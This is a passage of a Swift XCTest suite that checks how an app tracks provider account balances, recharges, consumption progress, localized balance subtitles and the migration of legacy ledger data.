            sampleSequence: upgraded.beginSample(), observedAt: time.addingTimeInterval(120)).get()
        XCTAssertEqual(observed.recharge, BalanceRecharge(amountCents: 22, observedAt: time))
        XCTAssertEqual(observed.progress, 100, accuracy: 0.000001)
        let restarted = ProviderBalanceProgressStore(defaults: defaults)
        restarted.prepareMigration(identities: [named])
        let afterRestart = try restarted.observe(amount: 3.19, unit: "CNY", identity: named,
            sampleSequence: restarted.beginSample(), observedAt: time.addingTimeInterval(180)).get()
        XCTAssertEqual(afterRestart.recharge, observed.recharge)
    }
}


extension DomainModelsTests {
    func testBalanceSubtitlePriorityCentsAndReferenceDates() throws {
        let zone = try XCTUnwrap(TimeZone(identifier: "UTC"))
        let parser = ISO8601DateFormatter()
        let start = try XCTUnwrap(parser.date(from: "2026-10-12T12:00:00Z"))
        let now = try XCTUnwrap(parser.date(from: "2026-10-15T12:00:00Z"))
        func snapshot(last: Int = 334, date: Date? = start, recharge: BalanceRecharge? = nil) -> Snapshot {
            .balance("same", Double(last) / 100, "USD", nil, now, progressPercentage: Double(last) / 4,
                recharge: recharge, progressContext: .init(baselineCents: 400, lastCents: last, peakCents: 400, baselineObservedAt: date))
        }
        XCTAssertEqual(snapshot().balanceSubtitle(now: now, timeZone: zone), tr(.keyBalanceUsedSinceRecharge, arguments: [tr(.keyBalanceLastRecharge), "$0.66"]))
        XCTAssertEqual(snapshot(last: 400).balanceSubtitle(now: now, timeZone: zone), tr(.keyBalanceUsedSinceRecharge, arguments: [tr(.keyBalanceLastRecharge), "$0.00"]))
        XCTAssertEqual(snapshot(date: nil).balanceSubtitle(now: now, timeZone: zone), tr(.keyBalanceUsed, arguments: ["$0.66"]))
        XCTAssertEqual(snapshot(last: 400, date: nil).balanceSubtitle(now: now, timeZone: zone), tr(.keyBalanceRecordingStarted))
        XCTAssertEqual(Snapshot.balance("old", 3.34, "USD", nil, now).balanceSubtitle(now: now, timeZone: zone), tr(.keyBalanceRecordingStarted))
        let recharge = BalanceRecharge(amountCents: 100, observedAt: now)
        XCTAssertEqual(snapshot(recharge: recharge).balanceSubtitle(now: now, timeZone: zone), tr(.keyBalanceUsedSinceRecharge, arguments: [tr(.keyBalanceLastRecharge), "$0.66"]))
        let lastYear = try XCTUnwrap(parser.date(from: "2025-12-31T23:30:00Z"))
        XCTAssertTrue(snapshot(date: lastYear).balanceProgressTooltip(now: now, timeZone: zone).contains("2025/12/31"))
        let east = try XCTUnwrap(TimeZone(identifier: "Asia/Shanghai"))
        XCTAssertTrue(snapshot(date: lastYear).balanceProgressTooltip(now: now, timeZone: east).contains("01/01"))
        XCTAssertTrue(snapshot().balanceProgressTooltip(now: now, timeZone: zone).contains("$4.00"))
        XCTAssertTrue(snapshot().balanceProgressTooltip(now: now, timeZone: zone).contains("84%"))
        XCTAssertFalse(snapshot(date: nil).balanceProgressTooltip(now: now, timeZone: zone).contains("10/"))
        XCTAssertEqual(snapshot(date: now).balanceSubtitle(now: now, timeZone: zone), tr(.keyBalanceUsedSinceRecharge, arguments: [tr(.keyBalanceLastRecharge), "$0.66"]))
        let yesterday = try XCTUnwrap(parser.date(from: "2026-10-14T12:00:00Z"))
        XCTAssertEqual(snapshot(date: yesterday).balanceSubtitle(now: now, timeZone: zone), tr(.keyBalanceUsedSinceRecharge, arguments: [tr(.keyBalanceLastRecharge), "$0.66"]))
    }

    func testProgressContextSurvivesSnapshotCacheAndRejectedOlderSamples() throws {
        let (defaults, suite) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suite) }
        let store = ProviderBalanceProgressStore(defaults: defaults)
        let id = ProviderBalanceProgressIdentity(client: .codex, providerID: "context", query: makeBalanceProgressQuery())
        let start = Date(timeIntervalSince1970: 1_700_000_000)
        let first = try store.observe(amount: 4, unit: "USD", identity: id, sampleSequence: store.beginSample(), observedAt: start).get()
        XCTAssertEqual(first.progressContext.baselineObservedAt, start)
        let older = store.beginSample()
        let latest = try store.observe(amount: 3.34, unit: "USD", identity: id, sampleSequence: store.beginSample(), observedAt: start.addingTimeInterval(60)).get()
        let late = try store.observe(amount: 10, unit: "USD", identity: id, sampleSequence: older, observedAt: start.addingTimeInterval(120)).get()
        XCTAssertFalse(late.accepted)
        XCTAssertEqual(late.progressContext, latest.progressContext)
        XCTAssertEqual(latest.progressContext.consumedCents, 66)
        let snapshot = Snapshot.balance("Provider", late.amount, late.unit, nil, late.observedAt,
            progressPercentage: late.displayProgress, recharge: late.recharge, progressContext: late.progressContext)
        var cache = ProviderBalanceSnapshotCache()
        cache.store(snapshot, clientID: "codex", providerID: "context")
        let failed = cache.errorSnapshot(clientID: "codex", providerID: "context", providerName: "Provider", reason: "fixture")
        XCTAssertEqual(failed.balanceProgressContext, latest.progressContext)
        XCTAssertEqual(failed.balanceRecharge, snapshot.balanceRecharge)
    }
}

extension DomainModelsTests {
    func testBalanceSubtitleArgumentsRenderInEveryLanguage() {
        let examples: [(LocalizationKey, [String])] = [
            (.keyBalanceUsedSince, ["10/12", "$0.66"]),
            (.keyBalanceUsedSinceToday, ["12:00", "$0.00"]),
            (.keyBalanceUsedSinceYesterday, ["14:20", "$0.66"]),
            (.keyBalanceUsed, ["$0.66"]),
            (.keyBalanceRecordingStartedOn, ["10/12"]),
            (.keyBalanceRecordingStarted, []),
            (.keyBalanceReferenceOn, ["10/12", "$4.00", "84%"]),
            (.keyBalanceReference, ["$4.00", "84%"]),
            (.keyBalanceReferenceUnavailable, [])]
        for language in AppLanguage.allCases where language != .system {
            for (key, arguments) in examples {
                let text = tr(key, arguments: arguments, language: language)
                XCTAssertFalse(text.contains("⟦"), "\(language): \(key)")
                for argument in arguments { XCTAssertTrue(text.contains(argument), "\(language): \(key): \(text)") }
            }
        }
    }
}

extension DomainModelsTests {
    func testRechargeAndInitialBaselineShareConsumptionPresentation() throws {
        let date = Date(timeIntervalSince1970: 1_792_150_600)
        let zone = try XCTUnwrap(TimeZone(identifier: "UTC"))
        let recharge = BalanceRecharge(amountCents: 1000, observedAt: date)
        let context = BalanceProgressContext(baselineCents: 1300, lastCents: 1200, peakCents: 1300, baselineObservedAt: date)
        let charged = Snapshot.balance("same", 12, "USD", nil, date, recharge: recharge, progressContext: context)
        XCTAssertEqual(charged.balanceDisplayConsumedCents, 100)
        XCTAssertEqual(charged.balanceSubtitle(now: date, timeZone: zone),
            tr(.keyBalanceUsedSinceRecharge, arguments: [tr(.keyBalanceLastRecharge), "$1.00"]))
        let rebasedContext = BalanceProgressContext(baselineCents: 1200, lastCents: 1200, peakCents: 1200,
            baselineObservedAt: date.addingTimeInterval(60))
        let rebased = Snapshot.balance("same", 12, "USD", nil, date, recharge: recharge, progressContext: rebasedContext)
        XCTAssertEqual(rebased.balanceDisplayConsumedCents, 0)
        XCTAssertEqual(rebased.balanceConsumptionStartDate, rebasedContext.baselineObservedAt)
        let uncharged = Snapshot.balance("same", 12, "USD", nil, date, progressContext: context)
        XCTAssertEqual(uncharged.balanceDisplayConsumedCents, 100)
        XCTAssertEqual(uncharged.balanceConsumptionStartDate, date)
        XCTAssertEqual(uncharged.balanceSubtitle(now: date, timeZone: zone),
            tr(.keyBalanceUsedSinceRecharge, arguments: [tr(.keyBalanceLastRecharge), "$1.00"]))
    }
}

extension DomainModelsTests {
    func testUnownedNameLedgerNeverMigratesIntoProviderAccounts() throws {
        let (defaults, suite) = makeDefaults()
        defer { defaults.removePersistentDomain(forName: suite) }
        let scope = try XCTUnwrap(ProviderBalanceProgressIdentity.nameScope(client: .codex, name: "same"))
        let legacy = try JSONSerialization.data(withJSONObject: ["wallet:\(scope):CNY": [
            "baselineCents": 1000, "lastCents": 375, "unit": "CNY", "peakCents": 1000,
            "baselineObservedAt": 100, "recharge": ["amountCents": 800, "observedAt": 100]]])
        defaults.set(legacy, forKey: ProviderBalanceProgressStore.storageKey)
        let store = ProviderBalanceProgressStore(defaults: defaults)
        let peers = ["a", "b"].map { ProviderBalanceProgressIdentity(client: .codex, providerID: $0,
            query: makeBalanceProgressQuery(), providerName: "same") }
        store.prepareMigration(identities: peers)
        for peer in peers {
            let value = try store.observe(amount: 3.75, unit: "CNY", identity: peer,
                sampleSequence: store.beginSample(), observedAt: Date()).get()
            XCTAssertNil(value.recharge)
            XCTAssertEqual(value.progressContext.baselineCents, 375)
        }
        let saved = try XCTUnwrap(defaults.data(forKey: ProviderBalanceProgressStore.storageKey))
        let dictionary = try XCTUnwrap(JSONSerialization.jsonObject(with: saved) as? [String: Any])
        XCTAssertNotNil(dictionary["wallet:\(scope):CNY"], "retain unverifiable history without assigning it to another account")
    }
}
